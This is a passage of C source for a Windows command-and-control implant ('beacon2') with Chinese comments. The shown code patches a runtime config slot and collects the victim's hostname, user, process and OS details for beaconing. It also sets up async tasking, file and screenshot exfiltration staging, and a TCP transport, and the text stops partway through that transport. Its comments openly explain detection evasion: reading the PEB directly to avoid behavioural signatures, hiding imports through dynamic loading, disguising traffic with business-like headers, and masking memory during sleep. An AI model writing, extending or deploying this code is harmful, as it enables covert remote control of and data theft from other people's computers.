/*
 * csdev :: beacon2.c  --  协议 v2 植入体 (RSA 交换 + AES-256/HMAC-SHA256 + TLV)
 * ==========================================================================
 * 与 v1 (win_beacon.c) 的根本区别:
 *   v1: 编译期硬编码共享 RC4 密钥, 纯文本命令
 *   v2: 每会话随机密钥经 RSA-2048 交换, AES-256-CBC 加密 + HMAC-SHA256 认证,
 *       TLV 结构化任务与结果, 分块文件传输, 运行期可热更新 sleep/jitter
 *
 * 依赖: KERNEL32 + ADVAPI32 + WINHTTP + msvcrt (与 v1 导入表一致, 无新增)
 *
 * 编译: tools/gen_payload.ps1 -Format win2-exe ...
 * ==========================================================================
 */
#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0601          /* Win7+ : 需要 GetTickCount64 */
#include <windows.h>
#include <winhttp.h>
#include <tlhelp32.h>

#include "../proto/frame.h"
#include "../crypto/crypto.h"
#include "pubkey.h"
#include "beacon2_ops.h"
#include "beacon2_proxy.h"
#include "sleepmask2.h"
#include "jpeg.h"
#include "shotstream.h"
#include "xform.h"
#include "bof.h"
#include "clr.h"
#include "wmi.h"
#include "token_gate.h"

/* ---------------------------------------------------------- 配置
 *
 * 分两层:
 *   1) **编译期默认值** (C2_*_DEF): 用 -D 覆盖, 是模板构建时的基准值。
 *   2) **运行时配置槽** (g_c2cfg):   服务端生成载荷时按偏移覆写的一段固定布局字节。
 *
 * 为什么要有第 2 层: 原先配置全靠 -D 注入, 于是每生成一个载荷都要**重新调 gcc 编译** ——
 * 生成端必须装 MinGW + PowerShell, 这是个很重的环境负担。
 * 现在把编译挪到项目构建期 (产出"模板"), 生成时只把配置写进模板副本, 生成端零工具链。
 *
 * 定位方式: 槽位开头是 8 字节高熵标记, 生成器在二进制里扫描它。
 * 用高熵非打印字节 (而不是 "RGC2CFG" 这种可读串) 是为了避免与代码里的字符串常量撞上 ——
 * 生成器要求**全文件恰好命中一次**, 命中 0 次或多次都直接报错。
 * 这样 PE / ELF / raw shellcode 三种形态可以用同一套定位逻辑, 不依赖节表。
 */

/* ---- 编译期默认值 ---- */

#ifdef C2_HOST
#define C2_HOST_DEF C2_HOST
#else
#define C2_HOST_DEF "127.0.0.1"
#endif

#ifdef C2_PORT
#define C2_PORT_DEF C2_PORT
#else
#define C2_PORT_DEF 8443
#endif

#ifdef C2_SSL
#define C2_SSL_DEF C2_SSL
#else
#define C2_SSL_DEF 0
#endif

#ifdef C2_URI
#define C2_URI_DEF C2_URI
#else
#define C2_URI_DEF "/submit"
#endif

#ifdef C2_SLEEP
#define C2_SLEEP_DEF C2_SLEEP
#else
#define C2_SLEEP_DEF 5000u
#endif

#ifdef C2_JITTER
#define C2_JITTER_DEF C2_JITTER
#else
#define C2_JITTER_DEF 10
#endif

#ifdef C2_XFORM
#define C2_XFORM_DEF C2_XFORM
#else
#define C2_XFORM_DEF "raw"
#endif

#ifdef C2_TOKEN_HASH
#define C2_GATE_DEF 1
#define C2_TOKEN_HASH_DEF C2_TOKEN_HASH
#ifdef C2_TOKEN_SALT
#define C2_TOKEN_SALT_DEF C2_TOKEN_SALT
#else
#define C2_TOKEN_SALT_DEF ""
#endif
#else
#define C2_GATE_DEF 0
#define C2_TOKEN_HASH_DEF ""
#define C2_TOKEN_SALT_DEF ""
#endif

/* 结构性开关保持编译期: 它们决定链接什么、代码怎么长, 不是"值" */
#ifndef C2_CHUNK
#define C2_CHUNK  (512u * 1024u)     /* 文件分块大小 */
#endif
#ifndef C2_TRANSPORT_TCP
#define C2_TRANSPORT_TCP 0           /* 1 = 使用 TCP 承载层 (对应服务端 --tcp) */
#endif
#ifndef C2_TRANSPORT_SMB
#define C2_TRANSPORT_SMB 0           /* 1 = 使用 SMB 命名管道承载层 (对应服务端 --smb) */
#endif
#ifndef C2_TRANSPORT_DNS
#define C2_TRANSPORT_DNS 0           /* 1 = 使用 DNS 承载层 (对应服务端 --dns) */
#endif
#ifndef C2_SLEEP_MASK
#define C2_SLEEP_MASK 0              /* 1 = 休眠期掩码非执行节 (生成器 -SleepMask) */
#endif
/* Malleable profile 的 metadata/id 落点:
 *   profile 里 `metadata { base64; header "X-Request-Id"; }` 这类声明的效果是
 *   "把会话标识放进某个头部"。服务端不做强校验, 但真实流量里带一个业务化的
 *   头 (而不是清一色的 application/octet-stream) 更贴近正常请求。 */
#ifndef C2_ID_HEADER
#define C2_ID_HEADER ""              /* 空 = 不带 */
#endif
#ifndef C2_ID_VALUE
#define C2_ID_VALUE ""
#endif
#ifndef C2_PIPE
#define C2_PIPE "\\\\.\\pipe\\csdev_pipe"
#endif

/* ---- 运行时配置槽 ----
 *
 * 布局必须与 go/gen_native.go 的 cfgLayout 表**逐字节对应**。
 * 改字段要同时改两处并递增 C2_CFG_VERSION, 否则生成器写进去的旧载荷会读错位。 */

#define C2_CFG_VERSION 1u

typedef struct {
    unsigned char magic[8];          /*  0   定位标记 */
    unsigned int  version;           /*  8   0 = 未启用 (用编译期默认值) */
    unsigned int  port;              /* 12 */
    unsigned int  sleep_ms;          /* 16 */
    unsigned int  jitter;            /* 20 */
    unsigned int  flags;             /* 24   bit0 = 启用 TLS */
    unsigned int  nonce;             /* 28   每次生成随机, 让不同载荷这段字节不同 */
    char          host[128];         /* 32 */
    char          uri[64];           /* 160 */
    char          xform[32];         /* 224 */
    char          token_salt[24];    /* 256 */
    char          token_hash[72];    /* 280 */
    char          id_header[48];     /* 352 */
    char          id_value[80];      /* 400 */
    unsigned char reserved[32];      /* 480 */
} C2_RUNTIME_CFG;                    /* 合计 512 */

/* 模板里的初始状态: 标记就位 (供生成器定位), version=0 → 未启用。
 * 这样手工 gcc 编译出来的模板仍然完全按编译期默认值跑。
 *
 * 放在独立节 `.c2cfg` 里有两个好处:
 *   1) 生成器可以直接查节表定位, 不必只靠扫描;
 *   2) raw shellcode 那份是用 `objcopy --only-section=.text` 提取的, 默认会把
 *      .rdata 整个丢掉 —— 配置槽必须有自己可点名的节, 才能被一起提取出来。
 *
 * **必须带 volatile。** 原因见 c2cfg() 上方的长注释 —— 去掉它会静默失效。 */
__attribute__((section(".c2cfg"), used))
static const volatile C2_RUNTIME_CFG g_c2cfg = {
    { 0x52, 0x47, 0x43, 0x32, 0xA5, 0x5A, 0xC3, 0x3C },
    0u, 0u, 0u, 0u, 0u, 0u,
    "", "", "", "", "", "", "",
    { 0 }
};

/* ---------------------------------------------------------------------------
 * 读取运行时配置槽。
 *
 * 这里踩过一个**极隐蔽**的坑, 必须记下来:
 *
 * 槽位原本声明成 `static const`, 访问器直接读它的字段。在 -O2 下编译器能看见
 * 它的初始值 (version=0、host=""), 于是把 c2cfg_ok() 常量折叠成恒假, 再把每个
 * 访问器折叠成对应的编译期默认值 —— **生成器写进文件里的配置一个字节都读不到**。
 *
 * 症状极难定位:
 *   - 用 -DC2_HOST=<真实地址> 直接编译的载荷**能跑** (折叠后用的就是那个地址);
 *   - 模板产出的载荷**永远连不上** (模板的编译期地址是占位值 0.0.0.0);
 *   - 更坑的是"手工把槽位改成 version=1 再看"这种验证**也会通过**, 因为编译期
 *     地址恰好是对的, 掩盖了槽位根本没被读取的事实。
 *
 * 所以改成: 首次使用时把整个槽位**逐字节经 volatile 读出**到一个普通副本,
 * 之后一律读副本。副本的内容编译器无法预知, 因此不会被折叠; 而写入侧
 * (生成器) 改的是同一个文件的同一段字节, 两边就此对齐。
 *
 * 移植或"优化"这段代码时**不要**把 volatile 去掉, 也不要改成直接读 g_c2cfg。 */
static C2_RUNTIME_CFG g_cfgcopy;
static int            g_cfgcopy_done;

static const C2_RUNTIME_CFG *c2cfg(void)
{
    if (!g_cfgcopy_done) {
        const volatile unsigned char *s = (const volatile unsigned char *)&g_c2cfg;
        unsigned char *d = (unsigned char *)&g_cfgcopy;
        unsigned int i;
        for (i = 0; i < (unsigned int)sizeof(g_cfgcopy); i++) d[i] = s[i];
        g_cfgcopy_done = 1;
    }
    return &g_cfgcopy;
}

/* 槽位是否已被生成器写入。
 * 只判 version + host —— **不要**在这里再写一份 magic 数组去比对:
 * 那会让 8 个标记字节在文件里出现两次, 破坏生成器"恰好命中一次"的校验。 */
static int c2cfg_ok(void)
{
    const C2_RUNTIME_CFG *c = c2cfg();
    return c->version == C2_CFG_VERSION && c->host[0] != '\0';
}

/* ---- 取值访问器 (运行时有值就用, 否则退回编译期默认) ---- */

static const char *c2cfg_host(void)
{
    const C2_RUNTIME_CFG *c = c2cfg();
    return c2cfg_ok() ? c->host : C2_HOST_DEF;
}

static unsigned short c2cfg_port(void)
{
    const C2_RUNTIME_CFG *c = c2cfg();
    unsigned int p = c2cfg_ok() ? c->port : (unsigned int)C2_PORT_DEF;
    if (p == 0u || p > 65535u) p = (unsigned int)C2_PORT_DEF;
    return (unsigned short)p;
}

static const char *c2cfg_uri(void)
{
    const C2_RUNTIME_CFG *c = c2cfg();
    return (c2cfg_ok() && c->uri[0]) ? c->uri : C2_URI_DEF;
}

static unsigned int c2cfg_sleep(void)
{
    const C2_RUNTIME_CFG *c = c2cfg();
    unsigned int v = c2cfg_ok() ? c->sleep_ms : (unsigned int)C2_SLEEP_DEF;
    if (v < 50u) v = 50u;                 /* 下界保护: 别把自己跑成忙等 */
    if (v > 3600000u) v = 3600000u;
    return v;
}

static unsigned int c2cfg_jitter(void)
{
    const C2_RUNTIME_CFG *c = c2cfg();
    unsigned int v = c2cfg_ok() ? c->jitter : (unsigned int)C2_JITTER_DEF;
    if (v > 90u) v = 90u;
    return v;
}

static int c2cfg_ssl(void)
{
    const C2_RUNTIME_CFG *c = c2cfg();
    return c2cfg_ok() ? (int)(c->flags & 1u) : (C2_SSL_DEF ? 1 : 0);
}

static const char *c2cfg_xform(void)
{
    const C2_RUNTIME_CFG *c = c2cfg();
    return (c2cfg_ok() && c->xform[0]) ? c->xform : C2_XFORM_DEF;
}

static const char *c2cfg_id_header(void)
{
    const C2_RUNTIME_CFG *c = c2cfg();
    return (c2cfg_ok() && c->id_header[0]) ? c->id_header : C2_ID_HEADER;
}

static const char *c2cfg_id_value(void)
{
    const C2_RUNTIME_CFG *c = c2cfg();
    return (c2cfg_ok() && c->id_value[0]) ? c->id_value : C2_ID_VALUE;
}

/* 供 token_gate.h 使用 (它在两个平台上共用, 所以只依赖这两个符号) */
const char *c2_gate_salt(void)
{
    return c2cfg_ok() ? g_c2cfg.token_salt : C2_TOKEN_SALT_DEF;
}

const char *c2_gate_hash(void)
{
    return c2cfg_ok() ? g_c2cfg.token_hash : C2_TOKEN_HASH_DEF;
}

/* ---- 把调用点重定向到访问器 ----
 * 这样做的好处是**只改这一处**, 二十来个使用点原样不动。 */
#undef C2_HOST
#undef C2_PORT
#undef C2_SSL
#undef C2_URI
#undef C2_SLEEP
#undef C2_JITTER
#undef C2_XFORM
#undef C2_ID_HEADER
#undef C2_ID_VALUE
#undef C2_TOKEN_HASH
#undef C2_TOKEN_SALT

#define C2_HOST       c2cfg_host()
#define C2_PORT       c2cfg_port()
#define C2_SSL        c2cfg_ssl()
#define C2_URI        c2cfg_uri()
#define C2_SLEEP      c2cfg_sleep()
#define C2_JITTER     c2cfg_jitter()
#define C2_XFORM      c2cfg_xform()
#define C2_ID_HEADER  c2cfg_id_header()
#define C2_ID_VALUE   c2cfg_id_value()

#define MAX_PLAIN (1536u * 1024u)
#define MAX_FRAME (MAX_PLAIN + 1024u)

/* ---------------------------------------------------------------- 全局 */

static unsigned char *g_tx;      /* 出站帧编码 */
static unsigned char *g_rx;      /* HTTP 响应原文 */
static unsigned char *g_pt;      /* 明文: 上行组装 / 下行批次 */
static unsigned char *g_out;     /* 出站 TLV 累积 (outbox) */
static unsigned int   g_outlen;

/* ---- 异步任务线程共享状态 (见 worker_proc 的说明) ---- */
#define TASKQ_MAX 64
typedef struct {
    unsigned int  id;
    unsigned char cls;
    char          alias[32];
    unsigned int  arglen;
    unsigned char *arg;        /* VirtualAlloc 复制的参数, 脱离下行缓冲生命周期 */
} qtask;

static qtask g_taskq[TASKQ_MAX];
static int   g_taskq_head, g_taskq_tail, g_taskq_n;
static CRITICAL_SECTION g_cs;        /* 保护 outbox 与任务队列的单一锁 */
static HANDLE  g_task_evt;
static HANDLE  g_worker;
static volatile int g_exiting;

static unsigned char *g_wscratch;    /* 工作线程私有命令暂存 */
static unsigned char *g_wxf_out;     /* 工作线程私有 xform 缓冲 (execute-assembly) */

static HINTERNET g_hs, g_hc;
static char      g_meta[512];    /* 元信息 (0x1F 分隔); 偏移 200 起复用为 cwd */

static cs_session g_sess_state;

/* profile body 变换 (编译期由生成器写入 C2_XFORM) */
#define XF_BUF_SIZE (4u * 1024u * 1024u)
static xform_chain    g_xf;
static unsigned char *g_xf_out;  /* 变换后的上行 body */
static unsigned char *g_xf_in;   /* 未变换的下行原始响应 */

/* 下载状态机 (同一时刻只允许一个未完成传输)
 * kind: 0 = 流式读文件, 1 = 内存缓冲 (截屏等一次性大数据) */
static int           g_dl_active;
static unsigned int  g_dl_job;
static unsigned int  g_dl_off;
static unsigned int  g_dl_total;
static unsigned char *g_dl_mem;
static char          g_dl_path[400];

/* 传输串行化: 同一时刻只允许一个传输任务。
 * 若在传输进行中直接启动新传输, 会覆盖 g_dl_* 状态导致前一个传输永久不完整
 * (实测: 截屏回传中途收到 download 命令, 截屏文件永远收不齐)。
 * 因此忙时把传输类任务暂存, 等当前传输结束后再执行。 */
#define PEND_MAX     16
#define PEND_ARG_MAX 65536

typedef struct {
    unsigned int  id;
    unsigned char cls;
    char          alias[32];
    unsigned int  arglen;
    unsigned char arg[PEND_ARG_MAX];
} pend_task;

static pend_task g_pend[PEND_MAX];
static int       g_pend_n;

/* ------------------------------------------------------------ 基础工具 */

static void bmemcpy(void *d, const void *s, unsigned int n)
{
    unsigned char *dp = (unsigned char *)d;
    const unsigned char *sp = (const unsigned char *)s;
    while (n--) *dp++ = *sp++;
}

static void bmemset(void *d, int v, unsigned int n)
{
    unsigned char *dp = (unsigned char *)d;
    while (n--) *dp++ = (unsigned char)v;
}

static unsigned int bstrlen(const char *s)
{
    unsigned int n = 0;
    while (s[n]) n++;
    return n;
}

static void bstrcpy_n(char *d, const char *s, unsigned int cap)
{
    unsigned int i = 0;
    if (cap == 0) return;
    while (s[i] && i < cap - 1) { d[i] = s[i]; i++; }
    d[i] = 0;
}

/* ------------------------------------------------------------ 临时文件 */

/* 生成 %TEMP%\cs_<随机 hex>.<ext>; 失败返回 0 */
static int temp_path(char *out, unsigned int cap, const char *ext)
{
    char dir[300];
    unsigned char rnd[6];
    unsigned int i, m = 0, k;
    static const char hexd[] = "0123456789abcdef";
    DWORD n = GetTempPathA(sizeof(dir), dir);

    if (n == 0 || n >= sizeof(dir)) return 0;
    for (i = 0; dir[i] && m < cap - 40u; i++) out[m++] = dir[i];
    {
        const char *pfx = "cs_";
        for (k = 0; pfx[k] && m < cap - 40u; k++) out[m++] = pfx[k];
    }
    if (!csdev_random(rnd, sizeof(rnd))) return 0;
    for (i = 0; i < sizeof(rnd) && m < cap - 16u; i++) {
        out[m++] = hexd[(rnd[i] >> 4) & 0x0F];
        out[m++] = hexd[rnd[i] & 0x0F];
    }
    if (m < cap - 2u) out[m++] = '.';
    for (i = 0; ext[i] && m < cap - 2u; i++) out[m++] = ext[i];
    out[m] = 0;
    return 1;
}

static int write_all_file(const char *path, const unsigned char *data, unsigned int len)
{
    HANDLE h = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                           FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD written = 0;
    int ok;
    if (h == INVALID_HANDLE_VALUE) return 0;
    ok = WriteFile(h, data, len, &written, NULL) && written == len;
    CloseHandle(h);
    if (!ok) DeleteFileA(path);
    return ok;
}

static unsigned int read_all_file(const char *path, unsigned char *out, unsigned int cap)
{
    HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,
                           FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD got = 0;
    unsigned int total = 0;
    if (h == INVALID_HANDLE_VALUE) return 0;
    while (total < cap) {
        if (!ReadFile(h, out + total, cap - total, &got, NULL) || got == 0) break;
        total += got;
    }
    CloseHandle(h);
    return total;
}

/* -------------------------------------------------------------- PEB 读取 */

/* 从 PEB 直接取进程映像名 —— 不调用 GetModuleFileNameA, 避免自读取行为链特征 */
static unsigned long long gs_base(void)
{
    unsigned long long v;
    __asm__ __volatile__("movq %%gs:0x60, %0" : "=r"(v));
    return v;
}

static void peb_image_name(char *out, unsigned int cap)
{
    unsigned char *peb, *pp;
    unsigned short len;
    unsigned short *buf;
    unsigned int i, start = 0;

    if (cap == 0) return;
    out[0] = 0;

    peb = (unsigned char *)(unsigned long long)gs_base();
    if (!peb) return;
    pp = *(unsigned char **)(peb + 0x20);
    if (!pp) return;

    len = *(unsigned short *)(pp + 0x60);
    buf = *(unsigned short **)(pp + 0x68);
    if (!buf || len == 0 || len > 1024) return;

    len /= 2;
    for (i = 0; i < len; i++) {
        if (buf[i] == L'\\' || buf[i] == L'/') start = i + 1;
    }
    for (i = start; i < len && (i - start) < cap - 1; i++) {
        unsigned int w = buf[i];
        out[i - start] = (w < 128 && w != 0) ? (char)w : '?';
    }
    out[i - start] = 0;
}

static void peb_os_version(char *out, unsigned int cap)
{
    unsigned char *peb;
    unsigned int major, minor, build;

    peb = (unsigned char *)(unsigned long long)gs_base();
    if (!peb || cap < 16) { bstrcpy_n(out, "?.?", cap); return; }

    major = *(unsigned int *)(peb + 0x118);
    minor = *(unsigned int *)(peb + 0x11C);
    build = *(unsigned short *)(peb + 0x120);
    if (major == 0 || major > 20 || minor > 20) { bstrcpy_n(out, "?.?", cap); return; }

    {
        char t[8];
        unsigned int n = 0, i;
        t[n++] = (char)('0' + (major / 10)); t[n++] = (char)('0' + (major % 10));
        t[n++] = '.'; if (n >= sizeof(t)) n = sizeof(t) - 1;
        t[n++] = (char)('0' + (minor % 10));
        t[n] = 0;
        /* major < 10 时去掉前导 0 */
        if (major < 10) { bstrcpy_n(out, t + 1, cap); } else { bstrcpy_n(out, t, cap); }
        i = bstrlen(out);
        if (i + 8 < cap) {
            out[i++] = '.';
            {
                char b[8]; int m = 0, k;
                unsigned int v = build;
                if (v == 0) b[m++] = '0';
                while (v) { b[m++] = (char)('0' + (v % 10)); v /= 10; }
                for (k = m - 1; k >= 0 && i < cap - 1; k--) out[i++] = b[k];
            }
            out[i] = 0;
        }
    }
}

/* 父进程 PID */
static unsigned int parent_pid(void)
{
    HANDLE snap;
    PROCESSENTRY32 pe;
    unsigned int me = GetCurrentProcessId(), ppid = 0;

    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    pe.dwSize = sizeof(pe);
    if (Process32First(snap, &pe)) {
        do {
            if (pe.th32ProcessID == me) { ppid = pe.th32ParentProcessID; break; }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return ppid;
}

/* 采集 meta: host \x1F user \x1F arch \x1F pid \x1F ppid \x1F proc \x1F ip \x1F os */
static unsigned int build_meta(char *out, unsigned int cap)
{
    char host[128], user[128], proc[128], os[32];
    DWORD hl = 127, ul = 127;
    unsigned int i = 0;
    char pidbuf[16], ppidbuf[16];
    char slbuf[16], jtbuf[16];

    host[0] = 0; user[0] = 0;
    GetComputerNameA(host, &hl);
    GetUserNameA(user, &ul);
    peb_image_name(proc, sizeof(proc));
    peb_os_version(os, sizeof(os));

    {
        unsigned int v = GetCurrentProcessId();
        int n = 0, k;
        char t[16];
        if (v == 0) t[n++] = '0';
        while (v) { t[n++] = (char)('0' + (v % 10)); v /= 10; }
        for (k = 0; k < n; k++) pidbuf[k] = t[n - 1 - k];
        pidbuf[n] = 0;
    }
    {
        unsigned int v = parent_pid();
        int n = 0, k;
        char t[16];
        if (v == 0) t[n++] = '0';
        while (v) { t[n++] = (char)('0' + (v % 10)); v /= 10; }
        for (k = 0; k < n; k++) ppidbuf[k] = t[n - 1 - k];
        ppidbuf[n] = 0;
    }

#define APPEND_FIELD(s) do {                                    \
        unsigned int L = bstrlen(s), k;                         \
        for (k = 0; k < L && i < cap - 1; k++) out[i++] = (s)[k]; \
        if (i < cap - 1) out[i++] = (char)0x1F;                 \
    } while (0)

    APPEND_FIELD(host);
    APPEND_FIELD(user);
    APPEND_FIELD("x64");
    APPEND_FIELD(pidbuf);
    APPEND_FIELD(ppidbuf);
    APPEND_FIELD(proc);
    APPEND_FIELD("-");          /* 内网地址: 无新增依赖可取的途径, 占位 */
    APPEND_FIELD(os);

    /* 第 9/10 字段: 编译期 sleep / jitter。
       以前 meta 只有 8 个字段, 服务端拿不到真实值, 只能硬编码猜 5000/10 ——
       于是 GUI 里显示的 sleep 永远和植入体实际配置对不上, 会让操作员误判"延迟高"。
       放在**末尾**是为了兼容: meta_len 只有 1 字节, 溢出被截断时丢的只是这两个,
       服务端照旧回落到默认值, 老植入体也完全不受影响。 */
    {
        unsigned int v = C2_SLEEP;
        int n = 0, k;
        char t[16];
        if (v == 0) t[n++] = '0';
        while (v) { t[n++] = (char)('0' + (v % 10)); v /= 10; }
        for (k = 0; k < n; k++) slbuf[k] = t[n - 1 - k];
        slbuf[n] = 0;
    }
    {
        unsigned int v = (unsigned int)C2_JITTER;
        int n = 0, k;
        char t[16];
        if (v == 0) t[n++] = '0';
        while (v) { t[n++] = (char)('0' + (v % 10)); v /= 10; }
        for (k = 0; k < n; k++) jtbuf[k] = t[n - 1 - k];
        jtbuf[n] = 0;
    }
    APPEND_FIELD(slbuf);
    APPEND_FIELD(jtbuf);

#undef APPEND_FIELD

    if (i > 0 && out[i - 1] == (char)0x1F) i--;   /* 去掉尾部分隔符 */
    out[i] = 0;
    return i;
}

/* ---------------------------------------------------------------- outbox */

#define BOX_FAIL ((unsigned int)-1)

static int box_space(unsigned int need)
{
    int ok;
    EnterCriticalSection(&g_cs);
    ok = (g_outlen + need) <= MAX_PLAIN;
    LeaveCriticalSection(&g_cs);
    return ok;
}

/* 预留 TLV 空间, 返回数据写入位置 (相对 g_out)。
 * TLV 头为 [2B type][4B len] 共 6 字节 —— 4 字节长度是必须的,
 * 2 字节装不下 512 KB 的分块长度 (会被静默截断导致整条流错位)。
 * 失败返回 BOX_FAIL —— 注意起始偏移 0 是合法值, 不能用 0 表示失败。 */
static unsigned int box_begin(unsigned short type, unsigned int need)
{
    unsigned int start;

    /* 加锁到 box_end: 保证"预留-写入-提交"这一整条 TLV 的写入是原子的。
     * 工作线程和主循环的 pump 都在往 outbox 追加, 不加锁会在预留与提交之间
     * 被互相打断, 产生长度错位的脏 TLV。 */
    EnterCriticalSection(&g_cs);
    if (!box_space(need + 6u)) {
        LeaveCriticalSection(&g_cs);
        return BOX_FAIL;
    }

    start = g_outlen;
    cs_put_be16(g_out + start, type);
    cs_put_be32(g_out + start + 2, 0);          /* 长度占位 */
    g_outlen = start + 6u;
    return start;                               /* 锁保持到 box_end */
}

static void box_end(unsigned int start, unsigned int datalen)
{
    cs_put_be32(g_out + start + 2, datalen);
    g_outlen = start + 6u + datalen;
    LeaveCriticalSection(&g_cs);
}

static void box_result(unsigned int task_id, unsigned char status,
                       const unsigned char *data, unsigned int datalen)
{
    unsigned int start = box_begin(T_RESULT, 9u + datalen);
    unsigned int p;

    if (start == BOX_FAIL) return;             /* outbox 满: 丢弃本次结果 */
    p = g_outlen;
    cs_put_be32(g_out + p, task_id);
    g_out[p + 4] = status;
    cs_put_be32(g_out + p + 5, datalen);
    if (datalen && data) bmemcpy(g_out + p + 9, data, datalen);
    box_end(start, 9u + datalen);
}

static void box_result_str(unsigned int task_id, unsigned char status, const char *s)
{
    box_result(task_id, status, (const unsigned char *)s, bstrlen(s));
}

/* 向 outbox 追加一条 TLV, 供代理模块把待发数据写回。
 * 返回 0 = 成功, 非 0 = outbox 满。 */
static int proxy_sink(unsigned short type, const unsigned char *data, unsigned int len)
{
    unsigned int start = box_begin(type, len);
    if (start == BOX_FAIL) return 1;
    if (len) bmemcpy(g_out + g_outlen, data, len);
    box_end(start, len);
    return 0;
}

/* ---------------------------------------------------------------- 通信 */

#if C2_TRANSPORT_TCP
/* ============================ TCP 承载层 ============================
 * 与 HTTP 承载完全共用帧格式 (加密/TLV/任务), 仅分帧方式不同:
 *   [4B 大端长度][帧字节]
 * ws2_32 全部运行期解析, 静态导入表保持不变。
 * ==================================================================== */

typedef struct { unsigned short family; unsigned short port; unsigned int addr; char zero[8]; } TCPADDR;

typedef struct {
    unsigned int  sock;                 /* SOCKET, 0xFFFFFFFF = 无效 */
    int           started;
    int           (WINAPI *WSAStartup)(unsigned short, void *);
    int           (WINAPI *WSACleanup)(void);
    unsigned int  (WINAPI *sock_open)(int, int, int);
    int           (WINAPI *sock_conn)(unsigned int, const void *, int);
    int           (WINAPI *sock_send)(unsigned int, const char *, int, int);
    int           (WINAPI *sock_recv)(unsigned int, char *, int, int);
    int           (WINAPI *sock_close)(unsigned int);
    int           (WINAPI *sock_opt)(unsigned int, int, int, const char *, int);
    unsigned short(WINAPI *htons_)(unsigned short);
    unsigned int  (WINAPI *inet_addr_)(const char *);
} TCPDYN;

static TCPDYN g_tcp;

static int tcp_dyn_load(void)
{
    HMODULE h;
    if (g_tcp.WSAStartup) return 1;

    /* TF_DEPENDENT 分支只在 TCP 模式下编译, 不影响 HTTP 版导入表 */
    h = LoadLibraryA("ws2_32.dll");
    if (!h) return 0;

    *(FARPROC *)&g_tcp.WSAStartup = GetProcAddress(h, "WSAStartup");
    *(FARPROC *)&g_tcp.WSACleanup = GetProcAddress(h, "WSACleanup");
    *(FARPROC *)&g_tcp.sock_open  = GetProcAddress(h, "socket");
    *(FARPROC *)&g_tcp.sock_conn  = GetProcAddress(h, "connect");
    *(FARPROC *)&g_tcp.sock_send  = GetProcAddress(h, "send");
    *(FARPROC *)&g_tcp.sock_recv  = GetProcAddress(h, "recv");
    *(FARPROC *)&g_tcp.sock_close = GetProcAddress(h, "closesocket");
    *(FARPROC *)&g_tcp.sock_opt   = GetProcAddress(h, "setsockopt");
    *(FARPROC *)&g_tcp.htons_     = GetProcAddress(h, "htons");
    *(FARPROC *)&g_tcp.inet_addr_ = GetProcAddress(h, "inet_addr");

    return g_tcp.WSAStartup && g_tcp.sock_open && g_tcp.sock_conn &&
           g_tcp.sock_send && g_tcp.sock_recv && g_tcp.sock_close && g_tcp.htons_;
}

/* SO_RCVTIMEO / SO_SNDTIMEO = 0x1006 / 0x1005, SOL_SOCKET = 0xFFFF */
static void tcp_set_timeout(unsigned int s, int optname, DWORD ms)
{
    if (g_tcp.sock_opt) {
        g_tcp.sock_opt(s, 0xFFFF, optname, (const char *)&ms, (int)sizeof(ms));
    }
}

static int tcp_connect(void)
{
    unsigned char wsadata[512];
    TCPADDR sa;
    int i;

    if (!tcp_dyn_load()) return 0;

    if (!g_tcp.started) {
        for (i = 0; i < (int)sizeof(wsadata); i++) wsadata[i] = 0;
        if (g_tcp.WSAStartup(0x0202, wsadata) != 0) return 0;
        g_tcp.started = 1;
    }

    g_tcp.sock = g_tcp.sock_open(2, 1, 0);       /* AF_INET, SOCK_STREAM */
    if (g_tcp.sock == 0xFFFFFFFFu) return 0;

    for (i = 0; i < (int)sizeof(sa); i++) ((unsigned char *)&sa)[i] = 0;
    sa.family = 2;
    sa.port   = g_tcp.htons_((unsigned short)C2_PORT);
    sa.addr   = g_tcp.inet_addr_(C2_HOST);
    if (sa.addr == 0xFFFFFFFFu) { g_tcp.sock_close(g_tcp.sock); g_tcp.sock = 0xFFFFFFFFu; return 0; }

    if (g_tcp.sock_conn(g_tcp.sock, &sa, (int)sizeof(sa)) != 0) {
        g_tcp.sock_close(g_tcp.sock);
        g_tcp.sock = 0xFFFFFFFFu;
        return 0;
    }

    tcp_set_timeout(g_tcp.sock, 0x1005, 30000);  /* SO_SNDTIMEO */
    tcp_set_timeout(g_tcp.sock, 0x1006, 30000);  /* SO_RCVTIMEO */
    return 1;
}

static void tcp_close(void)
{
    if (g_tcp.sock && g_tcp.sock != 0xFFFFFFFFu && g_tcp.sock_close) {
        g_tcp.sock_close(g_tcp.sock);
    }
    g_tcp.sock = 0xFFFFFFFFu;
}

static int tcp_send_all(const unsigned char *d, unsigned int n)
{
    unsigned int sent = 0;
    while (sent < n) {
        int r = g_tcp.sock_send(g_tcp.sock, (const char *)(d + sent), (int)(n - sent), 0);
        if (r <= 0) return 0;
        sent += (unsigned int)r;
    }
    return 1;
}

static int tcp_recv_all(unsigned char *d, unsigned int n)
{
    unsigned int got = 0;
    while (got < n) {
        int r = g_tcp.sock_recv(g_tcp.sock, (char *)(d + got), (int)(n - got), 0);
        if (r <= 0) return 0;
        got += (unsigned int)r;
    }
    return 1;
}

static int c2_open(void)
{
    g_tcp.sock = 0xFFFFFFFFu;
    return tcp_connect();
}

static void c2_close(void)
{
    tcp_close();
    if (g_tcp.started && g_tcp.WSACleanup) {
        g_tcp.WSACleanup();
        g_tcp.started = 0;
    }
}

static unsigned int c2_post(const unsigned char *data, unsigned int len,
                            unsigned char *out, unsigned int outcap)
{
    unsigned char  hdr[4];
    unsigned char *snd;
    unsigned int   sndlen = len, rlen;

    if (!g_tcp.sock || g_tcp.sock == 0xFFFFFFFFu) {
        if (!tcp_connect()) return 0;
    }

    if (g_xf.n > 0) {
        unsigned int xl = 0;
        if (xform_encode(&g_xf, data, len, g_xf_out, XF_BUF_SIZE, &xl) != 0) return 0;
        snd = g_xf_out;
        sndlen = xl;
    } else {
        snd = (unsigned char *)data;
    }
    if (sndlen == 0 || sndlen > (8u << 20)) return 0;

    hdr[0] = (unsigned char)(sndlen >> 24);
    hdr[1] = (unsigned char)(sndlen >> 16);
    hdr[2] = (unsigned char)(sndlen >> 8);
